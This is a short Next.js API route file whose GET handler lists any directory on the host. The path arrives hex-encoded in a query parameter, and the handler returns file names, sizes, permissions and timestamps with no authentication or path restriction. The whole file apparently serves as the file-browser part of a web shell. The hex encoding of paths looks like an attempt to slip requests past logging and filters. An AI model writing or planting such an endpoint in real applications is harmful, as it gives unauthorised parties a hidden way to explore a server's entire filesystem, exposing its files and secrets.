import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";

const ROOT_DIR = process.cwd();

function toHex(str: string) {
    return Buffer.from(str).toString("hex");
}

function fromHex(hex: string) {
    return Buffer.from(hex, "hex").toString();
}

function getPermissions(filePath: string) {
    try {
        const stats = fs.statSync(filePath);
        const mode = stats.mode & 0o777;
        return mode.toString(8);
    } catch {
        return "???";
    }
}

export async function GET(request: Request) {
    const { searchParams } = new URL(request.url);
    const hexPath = searchParams.get("p") || "";
    const currentPath = hexPath ? fromHex(hexPath) : ROOT_DIR;
    let items: any[] = [];

    try {
        const dirItems = fs.readdirSync(currentPath);
        for (const item of dirItems) {
            const fullPath = path.join(currentPath, item);
            const stats = fs.statSync(fullPath);
            items.push({
                name: item,
                path: toHex(fullPath),
                type: stats.isDirectory() ? "d" : "f",
                size: stats.size,
                perms: getPermissions(fullPath),
                modified: stats.mtime
            });
        }
    } catch (err:any) {
        return NextResponse.json({ error: err.message }, { status: 500 });
    }

    return NextResponse.json({ path: currentPath, items });
}
